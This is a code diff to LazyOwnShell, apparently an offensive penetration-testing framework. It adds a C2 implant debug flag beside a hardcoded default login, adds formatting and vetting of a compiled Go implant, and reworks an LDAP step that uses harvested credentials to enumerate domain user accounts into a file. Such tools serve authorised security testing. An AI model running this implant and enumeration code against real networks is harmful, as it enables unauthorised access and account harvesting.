@@ -255,6 +255,7 @@ class LazyOwnShell(cmd2.Cmd):
             "c2_port": 4444,
             "c2_user": c2_user,
             "c2_pass": c2_pass,
+            "enable_c2_implant_debug": True,
             "start_user": "grisun0",
             "start_pass": "grisgrisgris",
             "rhost": rhost,
@@ -557,6 +558,7 @@ class LazyOwnShell(cmd2.Cmd):
                             docstring += f"protocol:\n  {service.protocol}\n\n"
                             docstring += f"port:\n  {service.port}\n\n"
                             docstring += f"ip:\n  {host.address}\n\n"
+                            print(f"Valor de cmd_params['outputdir']: {cmd_params['outputdir']}")
                             docstring += f"logs:\n  {cmd_params["outputdir"]}\n"
                             tool_wrapper.__doc__ = docstring
 
@@ -10858,6 +10860,11 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(upx)                    
 
         print_msg(f"Go agent {implantgo} compiled successfully.")
+        cmd_fmt = f"go fmt {implant_go}"
+        cmd_vet = f"go vet {implant_go}"
+        self.cmd(cmd_fmt)
+        self.cmd(cmd_vet)
+
         md5 = f"md5sum {self.sessions_dir}/{binary}"
         md5sum = self.cmd(md5)
 
@@ -14833,13 +14840,10 @@ class LazyOwnShell(cmd2.Cmd):
             if not credentials:
                 return
             for username, password in credentials:
-                command = "ldapsearch -x -H ldap://{rhost} -D \"{username}@{domain}\" -w \"{password}\" -b 'dc={args[0]},dc={args[1]}' \"(objectClass=user)\" sAMAccountName | grep \"sAMAccountName\" | awk '{print $2}'".replace("{rhost}",rhost).replace("{username}",username).replace("{password}",password).replace("{domain}",domain).replace("{args[0]}",args[0]).replace("{args[1]}",args[1])
-        print_msg(command)
+                command = "ldapsearch -x -H ldap://{rhost} -D \"{username}@{domain}\" -w \"{password}\" -b 'dc={args[0]},dc={args[1]}' \"(objectClass=user)\" sAMAccountName | grep \"sAMAccountName\" | awk '{print $2}' > sessions/ldapsearch_{rhost}.txt".replace("{rhost}",rhost).replace("{username}",username).replace("{password}",password).replace("{domain}",domain).replace("{args[0]}",args[0]).replace("{args[1]}",args[1])
+
         self.cmd(command)
-        self.logcsv(f"ldapsearch {command}")
-        self.cmd(f"cat {log}")
-        self.cmd(f"cat {log} | grep lock")
-        self.cmd(f"grep \"userPrincipalName\" {log} | cut -d' ' -f2 | cut -d'@' -f1 >> sessions/users.txt")
+        self.cmd(f"cat {log} |  sed 's/requesting://' >> sessions/users.txt")
         return
 
     @cmd2.with_category(exploitation_category)   
